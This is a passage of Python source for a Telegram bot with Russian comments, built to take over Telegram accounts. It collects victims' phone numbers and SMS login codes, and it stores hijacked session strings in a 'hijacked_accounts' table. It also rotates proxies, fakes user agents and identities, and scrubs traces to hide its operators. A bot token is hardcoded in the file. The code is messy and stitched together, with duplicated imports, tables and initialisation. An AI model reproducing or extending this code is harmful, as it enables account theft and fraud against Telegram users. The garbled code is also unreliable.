import asyncio
import logging
import sqlite3
import random
import json
import os
import tempfile
import hashlib
import string
import secrets
import time

from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.filters import Command, CommandObject, Filter
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ReplyKeyboardRemove, CallbackQuery,
    Message, FSInputFile, InputFile,
    ChatPermissions, ChatAdministratorRights,
    WebAppInfo, MenuButtonWebApp
)
from aiogram.fsm.context import FSMContext
# Заменяем или добавляем этот импорт
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.storage.redis import RedisStorage
from aiogram.utils.deep_linking import create_start_link, decode_payload
from aiogram.utils.keyboard import InlineKeyboardBuilder, ReplyKeyboardBuilder
from aiogram.utils.token import TokenValidationError
# УБИРАЕМ проблемный импорт
# from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatMemberStatus, ChatType
from aiogram.methods import GetChat, GetChatMember, LeaveChat
from aiogram.exceptions import TelegramBadRequest, TelegramAPIError, TelegramUnauthorizedError
import aiohttp
import socks
from telethon import TelegramClient
from telethon.sessions import StringSession, SQLiteSession
from telethon.tl.functions.messages import ImportChatInviteRequest
from telethon.tl.types import InputPeerUser, InputPeerChannel, InputPhoneContact
import pyrogram
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid
import phonenumbers
from phonenumbers import carrier, timezone, geocoder
import qrcode
from io import BytesIO
import base64
import uuid
import cryptography
from cryptography.fernet import Fernet
import requests
from bs4 import BeautifulSoup
import fake_useragent
import cloudscraper
import undetected_chromedriver as uc
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import nest_asyncio
nest_asyncio.apply()
import asyncio
import logging
import sqlite3
import random
import json
import os
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ReplyKeyboardRemove
)
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.enums import ChatType
from aiogram.types import Message, ChatMemberUpdated, ChatJoinRequest
from functools import wraps
from aiogram.types import Message, CallbackQuery

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Загрузка переменных окружения
API_TOKEN = os.getenv('8568019720:AAGZhJHAvxNl2_CVYFgzW6B7nTKXZBDuUs8', 'YOUR_BOT_TOKEN_HERE')
ADMIN_ID = int(os.getenv('ADMIN_ID', '8358009538'))

# Инициализация
storage = MemoryStorage()
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=storage)

# ========== КОНФИГУРАЦИЯ ==========
class Config:
    def __init__(self):
        self.API_TOKEN = os.getenv('API_TOKEN', 'YOUR_BOT_TOKEN_HERE')
        self.MAIN_ADMIN_ID = int(os.getenv('MAIN_ADMIN_ID', 8358009538))
        self.SECRET_KEY = os.getenv('SECRET_KEY', Fernet.generate_key().decode())
        self.ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY', Fernet.generate_key().decode())
        
        # Telegram API для захвата аккаунтов
        self.TELEGRAM_API_ID = int(os.getenv('TELEGRAM_API_ID', 0))
        self.TELEGRAM_API_HASH = os.getenv('TELEGRAM_API_HASH', '')
        
        # Настройки прокси для анонимности
        self.PROXY_URL = os.getenv('PROXY_URL', '')
        self.PROXY_TYPE = os.getenv('PROXY_TYPE', 'socks5')
        self.PROXY_AUTH = os.getenv('PROXY_AUTH', '')
        
        # Настройки базы данных
        self.DB_PATH = os.getenv('DB_PATH', 'swill_bot.db')
        self.REDIS_URL = os.getenv('REDIS_URL', 'redis://localhost:6379/0')
        
        # Настройки безопасности
        self.MAX_ADMINS = int(os.getenv('MAX_ADMINS', 50))
        self.MAX_CHANNELS = int(os.getenv('MAX_CHANNELS', 100))
        self.SESSION_TIMEOUT = int(os.getenv('SESSION_TIMEOUT', 3600))
        
        # Веб-сервер для анонимности
        self.WEB_HOST = os.getenv('WEB_HOST', '0.0.0.0')
        self.WEB_PORT = int(os.getenv('WEB_PORT', 8080))
        
    def validate(self):
        if not self.API_TOKEN or self.API_TOKEN == 'YOUR_BOT_TOKEN_HERE':
            raise ValueError("API_TOKEN не установлен")
        if not self.TELEGRAM_API_ID or not self.TELEGRAM_API_HASH:
            logging.warning("Telegram API credentials не установлены. Функции захвата отключены.")
        return True

config = Config()
config.validate()

# ========== НАСТРОЙКА ЛОГИРОВАНИЯ ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - [%(filename)s:%(lineno)d] - %(message)s',
    handlers=[
        logging.FileHandler('swill_bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Отключаем логирование сторонних библиотек
logging.getLogger('aiogram').setLevel(logging.WARNING)
logging.getLogger('telethon').setLevel(logging.WARNING)
logging.getLogger('pyrogram').setLevel(logging.WARNING)
logging.getLogger('aiohttp').setLevel(logging.WARNING)
logging.getLogger('asyncio').setLevel(logging.WARNING)

def create_bot_with_proxy():
    """Создает бота с настройками прокси для анонимности"""
    
    # Генерируем случайный user-agent
    user_agent = fake_useragent.UserAgent().random
    
    # Создаем сессию с прокси если есть
    session = None
    if config.PROXY_URL:
        try:
            from aiogram.client.session.aiohttp import AiohttpSession
            
            if config.PROXY_TYPE == 'socks5':
                from aiohttp_socks import ProxyConnector
                
                # Парсим URL прокси
                if '@' in config.PROXY_URL:
                    # Прокси с аутентификацией
                    proxy_parts = config.PROXY_URL.split('@')
                    auth_part = proxy_parts[0]
                    host_part = proxy_parts[1]
                    
                    auth_parts = auth_part.split(':')
                    proxy_user = auth_parts[0]
                    proxy_pass = auth_parts[1] if len(auth_parts) > 1 else ''
                    
                    host_parts = host_part.split(':')
                    proxy_host = host_parts[0]
                    proxy_port = int(host_parts[1]) if len(host_parts) > 1 else 1080
                    
                    connector = ProxyConnector.from_url(
                        f"socks5://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}",
                        verify_ssl=False
                    )
                else:
                    # Прокси без аутентификации
                    connector = ProxyConnector.from_url(
                        f"socks5://{config.PROXY_URL}",
                        verify_ssl=False
                    )
            else:
                # HTTP прокси
                connector = aiohttp.TCPConnector(verify_ssl=False)
                proxy_url = config.PROXY_URL
            
            session = AiohttpSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=30)
            )
            
            logger.info(f"Бот настроен с прокси: {config.PROXY_URL}")
            
        except Exception as e:
            logger.error(f"Ошибка настройки прокси: {e}. Используется прямое подключение.")
            session = None
    
    # Для версий aiogram 3.7.0+ используем новый способ
    try:
        from aiogram.client.default import DefaultBotProperties
        
        # Создаем бота с новым синтаксисом
        bot = Bot(
            token=config.API_TOKEN,
            session=session,
            default=DefaultBotProperties(
                parse_mode=ParseMode.HTML,
                link_preview_is_disabled=True,
                protect_content=False
            )
        )
    except ImportError:
        # Для старых версий aiogram (до 3.7.0)
        bot = Bot(
            token=config.API_TOKEN,
            session=session,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
            protect_content=False
        )
        logger.warning("Используется старый синтаксис aiogram (версия < 3.7.0)")
    
    return bot

# Инициализация бота и диспетчера
bot = create_bot_with_proxy()
storage = MemoryStorage()  # Можно заменить на RedisStorage для продакшена
dp = Dispatcher(storage=storage)

# ========== ШИФРОВАНИЕ ДАННЫХ ==========
class DataEncryptor:
    """Класс для шифрования конфиденциальных данных"""
    
    def __init__(self, key: str = None):
        self.key = key or config.ENCRYPTION_KEY
        if isinstance(self.key, str):
            self.key = self.key.encode()
        
        # Дополняем ключ до 32 байт
        if len(self.key) < 32:
            self.key = self.key.ljust(32, b'0')
        elif len(self.key) > 32:
            self.key = self.key[:32]
        
        self.fernet = Fernet(base64.urlsafe_b64encode(self.key))
    
    def encrypt(self, data: str) -> str:
        """Шифрует данные"""
        try:
            encrypted = self.fernet.encrypt(data.encode())
            return encrypted.decode()
        except Exception as e:
            logger.error(f"Ошибка шифрования: {e}")
            return data
    
    def decrypt(self, encrypted_data: str) -> str:
        """Расшифровывает данные"""
        try:
            decrypted = self.fernet.decrypt(encrypted_data.encode())
            return decrypted.decode()
        except Exception as e:
            logger.error(f"Ошибка расшифровки: {e}")
            return encrypted_data
    
    def hash_data(self, data: str) -> str:
        """Создает хэш от данных"""
        return hashlib.sha256(data.encode()).hexdigest()
    
    def generate_token(self, length: int = 32) -> str:
        """Генерирует криптографически безопасный токен"""
        return secrets.token_urlsafe(length)

encryptor = DataEncryptor()

# Состояния FSM
class SellerStates(StatesGroup):
    waiting_phone = State()
    waiting_sms_code = State()
    waiting_item_type = State()
    waiting_photos = State()
    waiting_description = State()
    waiting_confirm = State()

# Инициализация БД
def init_db():
    conn = sqlite3.connect('user_bot.db', check_same_thread=False)
    cursor = conn.cursor()
    
    # Таблица пользователей
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            phone TEXT,
            code TEXT,
            balance REAL DEFAULT 0,
            rating INTEGER DEFAULT 5,
            status TEXT DEFAULT 'active',
            registered DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_activity DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Таблица товаров
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS items (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            item_type TEXT,
            photos TEXT,
            description TEXT,
            price REAL,
            moderator_id INTEGER,
            status TEXT DEFAULT 'pending',
            created DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')
    
    conn.commit()
    return conn, cursor

conn, cursor = init_db()

# Создаем директории для фотографий
os.makedirs('photos', exist_ok=True)
# ========== БАЗА ДАННЫХ ==========
class Database:
    """Расширенный класс для работы с базой данных"""
    
    def __init__(self, db_path: str = None):
        self.db_path = db_path or config.DB_PATH
        self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self.init_database()
    
    def init_database(self):
        """Инициализация всех таблиц базы данных"""
        # Таблица сессий пересылки сообщений
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS forwarding_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE NOT NULL,
                target_channel TEXT NOT NULL,
                status TEXT DEFAULT 'active',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME DEFAULT CURRENT_TIMESTAMP,
                message_count INTEGER DEFAULT 0,
                FOREIGN KEY (user_id) REFERENCES users(user_id)
            )
        ''')
        # В методе init_database() добавьте:
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS moderation_requests (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                request_id TEXT UNIQUE NOT NULL,
                user_id INTEGER NOT NULL,
                phone TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                code_sent TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                approved_by INTEGER,
                approved_at DATETIME,
                rejected_by INTEGER,
                rejected_at DATETIME,
                rejected_reason TEXT,
                FOREIGN KEY (user_id) REFERENCES users(user_id)
            )
        ''')
        # Добавьте в init_database():
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS forwarding_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE NOT NULL,
                target_channel TEXT NOT NULL,
                status TEXT DEFAULT 'active',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (user_id) REFERENCES users(user_id)
            )
        ''')
        # Таблица администраторов
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS admins (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE NOT NULL,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                phone_hash TEXT,
                added_by INTEGER,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_active DATETIME DEFAULT CURRENT_TIMESTAMP,
                permissions TEXT DEFAULT 'all',
                is_active BOOLEAN DEFAULT 1,
                is_main_admin BOOLEAN DEFAULT 0,
                security_level INTEGER DEFAULT 1,
                session_token TEXT,
                session_expires DATETIME,
                FOREIGN KEY (added_by) REFERENCES admins(user_id)
            )
        ''')
        
        # Таблица пользователей бота
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER UNIQUE NOT NULL,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                phone_hash TEXT,
                registered_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                messages_sent INTEGER DEFAULT 0,
                messages_received INTEGER DEFAULT 0,
                is_blocked BOOLEAN DEFAULT 0,
                block_reason TEXT,
                metadata TEXT DEFAULT '{}'
            )
        ''')
        
        # Таблица каналов и групп
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS channels (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                channel_id TEXT UNIQUE NOT NULL,
                channel_title TEXT,
                channel_username TEXT,
                channel_type TEXT DEFAULT 'channel',
                added_by INTEGER,
                added_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                is_approved BOOLEAN DEFAULT 0,
                approved_by INTEGER,
                approved_date DATETIME,
                notifications_enabled BOOLEAN DEFAULT 1,
                admin_notifications BOOLEAN DEFAULT 1,
                bot_is_admin BOOLEAN DEFAULT 0,
                bot_permissions TEXT DEFAULT '{}',
                last_message_id INTEGER,
                last_activity DATETIME DEFAULT CURRENT_TIMESTAMP,
                settings TEXT DEFAULT '{}',
                FOREIGN KEY (added_by) REFERENCES admins(user_id),
                FOREIGN KEY (approved_by) REFERENCES admins(user_id)
            )
        ''')
        
        # Таблица сообщений
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                message_id INTEGER,
                from_user_id INTEGER,
                from_admin_id INTEGER,
                to_user_id INTEGER,
                to_username TEXT,
                chat_id INTEGER,
                message_type TEXT,
                message_text TEXT,
                media_path TEXT,
                sent_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                delivered_date DATETIME,
                read_date DATETIME,
                status TEXT DEFAULT 'sent',
                encryption_key TEXT,
                reply_to_message_id INTEGER,
                forwarded_from TEXT,
                metadata TEXT DEFAULT '{}'
            )
        ''')
        
        # Таблица захваченных аккаунтов Telegram
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS hijacked_accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone_number TEXT UNIQUE NOT NULL,
                phone_hash TEXT,
                user_id INTEGER,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                session_string_encrypted TEXT,
                session_type TEXT DEFAULT 'telethon',
                hijacked_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                is_online BOOLEAN DEFAULT 0,
                last_check DATETIME DEFAULT CURRENT_TIMESTAMP,
                account_info TEXT DEFAULT '{}',
                security_settings TEXT DEFAULT '{}',
                flags TEXT DEFAULT '{}'
            )
        ''')
        
        # Таблица сессий захваченных аккаунтов
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS account_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                account_id INTEGER,
                session_id TEXT UNIQUE,
                session_data_encrypted TEXT,
                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_date DATETIME,
                is_valid BOOLEAN DEFAULT 1,
                last_activity DATETIME DEFAULT CURRENT_TIMESTAMP,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (account_id) REFERENCES hijacked_accounts(id)
            )
        ''')
        
        # Таблица действий с аккаунтами
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS account_actions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                account_id INTEGER,
                action_type TEXT NOT NULL,
                target TEXT,
                data TEXT,
                status TEXT DEFAULT 'pending',
                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed_date DATETIME,
                result TEXT,
                error_message TEXT,
                retry_count INTEGER DEFAULT 0,
                FOREIGN KEY (account_id) REFERENCES hijacked_accounts(id)
            )
        ''')
        
        # Таблица логов безопасности
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS security_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                user_id INTEGER,
                admin_id INTEGER,
                action TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                details TEXT,
                risk_level INTEGER DEFAULT 0,
                is_suspicious BOOLEAN DEFAULT 0
            )
        ''')
        
        # Таблица прокси серверов
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS proxies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                proxy_url TEXT UNIQUE NOT NULL,
                proxy_type TEXT DEFAULT 'socks5',
                country TEXT,
                city TEXT,
                speed REAL DEFAULT 0,
                uptime REAL DEFAULT 0,
                last_check DATETIME DEFAULT CURRENT_TIMESTAMP,
                is_active BOOLEAN DEFAULT 1,
                is_anonymous BOOLEAN DEFAULT 1,
                fail_count INTEGER DEFAULT 0,
                success_count INTEGER DEFAULT 0,
                auth_data TEXT,
                metadata TEXT DEFAULT '{}'
            )
        ''')
        
        # Таблица задач бота
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS bot_tasks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                task_type TEXT NOT NULL,
                task_data TEXT,
                created_by INTEGER,
                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                scheduled_date DATETIME,
                execute_date DATETIME,
                status TEXT DEFAULT 'pending',
                result TEXT,
                error_message TEXT,
                retry_count INTEGER DEFAULT 0,
                max_retries INTEGER DEFAULT 3,
                priority INTEGER DEFAULT 1,
                metadata TEXT DEFAULT '{}'
            )
        ''')
        
        # Таблица веб-хуков
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS webhooks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                webhook_url TEXT UNIQUE NOT NULL,
                secret_token TEXT,
                is_active BOOLEAN DEFAULT 1,
                created_date DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME,
                events TEXT DEFAULT '[]',
                metadata TEXT DEFAULT '{}'
            )
        ''')
        
        # Добавляем главного админа если нет
        self.cursor.execute(
            "SELECT 1 FROM admins WHERE user_id = ?",
            (config.MAIN_ADMIN_ID,)
        )
        if not self.cursor.fetchone():
            token = encryptor.generate_token()
            self.cursor.execute('''
                INSERT INTO admins 
                (user_id, username, first_name, is_main_admin, session_token, session_expires, permissions)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                config.MAIN_ADMIN_ID,
                'main_admin',
                'Главный Админ',
                1,
                token,
                (datetime.now() + timedelta(days=30)).isoformat(),
                'all'
            ))
            logger.info(f"Главный админ {config.MAIN_ADMIN_ID} добавлен в базу")
        
        self.conn.commit()
    
    def execute(self, query: str, params: tuple = ()):
        """Выполняет SQL запрос"""
        try:
            self.cursor.execute(query, params)
            self.conn.commit()
            return self.cursor
        except Exception as e:
            logger.error(f"Ошибка выполнения запроса: {e}")
            self.conn.rollback()
            raise
    
    def fetch_one(self, query: str, params: tuple = ()):
        """Возвращает одну строку"""
        self.cursor.execute(query, params)
        return self.cursor.fetchone()
    
    def fetch_all(self, query: str, params: tuple = ()):
        """Возвращает все строки"""
        self.cursor.execute(query, params)
        return self.cursor.fetchall()
    
    def close(self):
        """Закрывает соединение с БД"""
        self.conn.close()

db = Database()
# ========== МЕНЕДЖЕР ПЕРЕСЫЛКИ СООБЩЕНИЙ ==========
class MessageForwarder:
    """Управление пересылкой сообщений от пользователей в каналы"""
    
    def __init__(self):
        self.user_channels = {}  # {user_id: channel_id}
        self.load_user_channels()
    
    def load_user_channels(self):
        """Загружает привязки пользователей к каналам"""
        try:
            users = db.fetch_all("SELECT user_id, target_channel FROM forwarding_sessions WHERE status = 'active'")
            for user in users:
                self.user_channels[user[0]] = user[1]
            logger.info(f"Загружено {len(self.user_channels)} активных сессий пересылки")
        except Exception as e:
            logger.error(f"Ошибка загрузки сессий пересылки: {e}")
    
    async def setup_user_channel(self, user_id: int, channel_id: str) -> bool:
        """Привязывает пользователя к каналу для пересылки"""
        try:
            self.user_channels[user_id] = channel_id
            
            # Сохраняем в БД
            db.execute('''
                INSERT OR REPLACE INTO forwarding_sessions 
                (user_id, target_channel, status, created_at, last_used)
                VALUES (?, ?, ?, ?, ?)
            ''', (user_id, channel_id, 'active', datetime.now().isoformat(), datetime.now().isoformat()))
            
            # Получаем информацию о канале
            channel_info = db.fetch_one(
                "SELECT channel_title, is_approved FROM channels WHERE channel_id = ?",
                (channel_id,)
            )
            
            if channel_info:
                channel_title, is_approved = channel_info
                if is_approved:
                    await bot.send_message(
                        user_id,
                        f"✅ <b>ПЕРЕСЫЛКА НАСТРОЕНА!</b>\n\n"
                        f"📢 Канал: {channel_title}\n"
                        f"🔗 ID: {channel_id}\n\n"
                        f"Теперь все ваши сообщения в этом боте будут автоматически пересылаться в указанный канал.\n\n"
                        f"<i>Отправьте любое сообщение для теста.</i>",
                        parse_mode="HTML"
                    )
                    return True
            
            return False
            
        except Exception as e:
            logger.error(f"Ошибка настройки пересылки: {e}")
            return False
    
    async def forward_user_message(self, user_id: int, message: Message) -> Dict:
        """Пересылает сообщение пользователя в привязанный канал"""
        try:
            if user_id not in self.user_channels:
                return {'success': False, 'error': 'Канал не настроен для пересылки'}
            
            channel_id = self.user_channels[user_id]
            
            # Проверяем, что канал одобрен
            channel_data = db.fetch_one(
                "SELECT id, channel_title, is_approved, notifications_enabled FROM channels WHERE channel_id = ?",
                (channel_id,)
            )
            
            if not channel_data:
                return {'success': False, 'error': 'Канал не найден'}
            
            channel_db_id, channel_title, is_approved, notifications_enabled = channel_data
            
            if not is_approved:
                return {'success': False, 'error': 'Канал не одобрен'}
            
            if not notifications_enabled:
                return {'success': False, 'error': 'Уведомления в канале выключены'}
            
            # Получаем информацию о пользователе
            user_info = db.fetch_one(
                "SELECT phone, username, first_name FROM users WHERE user_id = ?",
                (user_id,)
            )
            
            phone = user_info[0] if user_info else "Не указан"
            username = user_info[1] if user_info else "Неизвестно"
            first_name = user_info[2] if user_info else "Пользователь"
            
            # Формируем заголовок сообщения
            header = f"👤 <b>СООБЩЕНИЕ ОТ ПОЛЬЗОВАТЕЛЯ</b>\n\n"
            header += f"📱 Телефон: <code>{phone}</code>\n"
            header += f"👤 Имя: {first_name}\n"
            header += f"🔗 Username: @{username}\n"
            header += f"🆔 User ID: <code>{user_id}</code>\n"
            header += f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}\n\n"
            
            # Пересылаем в зависимости от типа сообщения
            try:
                if message.text:
                    # Текстовое сообщение
                    sent_message = await bot.send_message(
                        channel_id,
                        header + message.text,
                        parse_mode="HTML"
                    )
                    
                elif message.photo:
                    # Фото с подписью
                    photo = message.photo[-1]
                    caption = message.caption or ""
                    
                    sent_message = await bot.send_photo(
                        channel_id,
                        photo.file_id,
                        caption=header + caption,
                        parse_mode="HTML"
                    )
                    
                elif message.video:
                    # Видео
                    sent_message = await bot.send_video(
                        channel_id,
                        message.video.file_id,
                        caption=header + (message.caption or ""),
                        parse_mode="HTML"
                    )
                    
                elif message.document:
                    # Документ
                    sent_message = await bot.send_document(
                        channel_id,
                        message.document.file_id,
                        caption=header + (message.caption or ""),
                        parse_mode="HTML"
                    )
                    
                elif message.audio:
                    # Аудио
                    sent_message = await bot.send_audio(
                        channel_id,
                        message.audio.file_id,
                        caption=header + (message.caption or ""),
                        parse_mode="HTML"
                    )
                    
                elif message.voice:
                    # Голосовое сообщение
                    sent_message = await bot.send_voice(
                        channel_id,
                        message.voice.file_id,
                        caption=header
                    )
                    
                else:
                    return {'success': False, 'error': 'Неподдерживаемый тип сообщения'}
                
                # Обновляем время последнего использования
                db.execute(
                    "UPDATE forwarding_sessions SET last_used = ? WHERE user_id = ?",
                    (datetime.now().isoformat(), user_id)
                )
                
                # Логируем пересылку
                db.execute('''
                    INSERT INTO messages 
                    (message_id, from_user_id, chat_id, message_type, 
                     message_text, sent_date, status, forwarded_to)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    sent_message.message_id,
                    user_id,
                    channel_id,
                    'forwarded_user',
                    message.text or message.caption or '[Медиа]',
                    datetime.now().isoformat(),
                    'forwarded',
                    channel_id
                ))
                
                return {
                    'success': True,
                    'message_id': sent_message.message_id,
                    'channel_id': channel_id,
                    'channel_title': channel_title
                }
                
            except TelegramBadRequest as e:
                error_msg = str(e)
                if "chat not found" in error_msg.lower():
                    return {'success': False, 'error': 'Канал не найден или бот не администратор'}
                elif "not enough rights" in error_msg.lower():
                    return {'success': False, 'error': 'Недостаточно прав для отправки в канал'}
                else:
                    return {'success': False, 'error': error_msg}
                    
        except Exception as e:
            logger.error(f"Ошибка пересылки сообщения: {e}")
            return {'success': False, 'error': str(e)}
    
    def get_user_channel(self, user_id: int) -> Optional[str]:
        """Получает привязанный канал для пользователя"""
        return self.user_channels.get(user_id)
    
    async def stop_forwarding(self, user_id: int) -> bool:
        """Останавливает пересылку для пользователя"""
        try:
            if user_id in self.user_channels:
                del self.user_channels[user_id]
            
            db.execute(
                "UPDATE forwarding_sessions SET status = 'stopped' WHERE user_id = ?",
                (user_id,)
            )
            
            await bot.send_message(
                user_id,
                "🛑 <b>ПЕРЕСЫЛКА ОСТАНОВЛЕНА</b>\n\n"
                "Ваши сообщения больше не будут пересылаться в канал.",
                parse_mode="HTML"
            )
            
            return True
            
        except Exception as e:
            logger.error(f"Ошибка остановки пересылки: {e}")
            return False


# ========== МЕНЕДЖЕР АНОНИМНОСТИ ==========
class AnonymityManager:
    """Управление анонимностью бота и операторов"""
    
    def __init__(self):
        self.user_agent_rotator = fake_useragent.UserAgent()
        self.current_proxy = None
        self.proxy_list = []
        self.load_proxies()
    
    def load_proxies(self):
        """Загружает прокси из базы данных"""
        try:
            proxies = db.fetch_all("SELECT proxy_url, proxy_type FROM proxies WHERE is_active = 1 ORDER BY speed DESC, uptime DESC")
            self.proxy_list = [{'url': p[0], 'type': p[1]} for p in proxies]
            logger.info(f"Загружено {len(self.proxy_list)} прокси из базы")
        except Exception as e:
            logger.error(f"Ошибка загрузки прокси: {e}")
            self.proxy_list = []
    
    def get_random_user_agent(self) -> str:
        """Возвращает случайный User-Agent"""
        return self.user_agent_rotator.random
    
    def get_random_proxy(self) -> Optional[Dict]:
        """Возвращает случайный рабочий прокси"""
        if not self.proxy_list:
            return None
        
        # Сортируем по скорости и аптайму
        sorted_proxies = sorted(
            self.proxy_list,
            key=lambda x: random.random() * 0.3 + 0.7,  # Случайность с приоритетом качества
            reverse=True
        )
        
        return sorted_proxies[0] if sorted_proxies else None
    
    async def check_proxy(self, proxy_url: str, proxy_type: str) -> bool:
        """Проверяет работоспособность прокси"""
        try:
            if proxy_type == 'socks5':
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(
                    f"{proxy_type}://{proxy_url}",
                    verify_ssl=False
                )
            else:
                connector = aiohttp.TCPConnector()
            
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get('https://api.telegram.org', timeout=10) as response:
                    return response.status == 200
        except:
            return False
    
    async def rotate_proxy(self):
        """Меняет текущий прокси"""
        if not self.proxy_list:
            self.current_proxy = None
            return
        
        # Ищем рабочий прокси
        for proxy in self.proxy_list[:10]:  # Проверяем первые 10
            if await self.check_proxy(proxy['url'], proxy['type']):
                self.current_proxy = proxy
                logger.info(f"Прокси изменен на: {proxy['url']}")
                return
        
        self.current_proxy = None
        logger.warning("Не найден рабочий прокси")
    
    def generate_fake_identity(self) -> Dict:
        """Генерирует фейковую личность для операций"""
        first_names = ['Алексей', 'Дмитрий', 'Иван', 'Михаил', 'Сергей', 'Андрей', 'Александр']
        last_names = ['Иванов', 'Петров', 'Сидоров', 'Смирнов', 'Кузнецов', 'Попов', 'Васильев']
        
        return {
            'first_name': random.choice(first_names),
            'last_name': random.choice(last_names),
            'username': f'user_{random.randint(100000, 999999)}',
            'phone': f'+7{random.randint(900, 999)}{random.randint(1000000, 9999999)}',
            'email': f'user_{random.randint(1000, 9999)}@example.com',
            'country': 'RU',
            'city': random.choice(['Москва', 'Санкт-Петербург', 'Новосибирск', 'Екатеринбург'])
        }
    
    def mask_ip_address(self, ip: str) -> str:
        """Маскирует IP адрес"""
        if not ip or ip == '127.0.0.1':
            return ip
        
        parts = ip.split('.')
        if len(parts) == 4:
            return f"{parts[0]}.{parts[1]}.*.*"
        
        return ip
    
    def clean_trace_data(self, data: Dict) -> Dict:
        """Очищает данные от следов"""
        cleaned = data.copy()
        
        # Удаляем потенциально идентифицирующие поля
        fields_to_remove = ['real_ip', 'actual_location', 'device_id', 'mac_address', 
                           'imei', 'serial_number', 'browser_fingerprint']
        
        for field in fields_to_remove:
            if field in cleaned:
                del cleaned[field]
        
        # Маскируем IP если есть
        if 'ip_address' in cleaned:
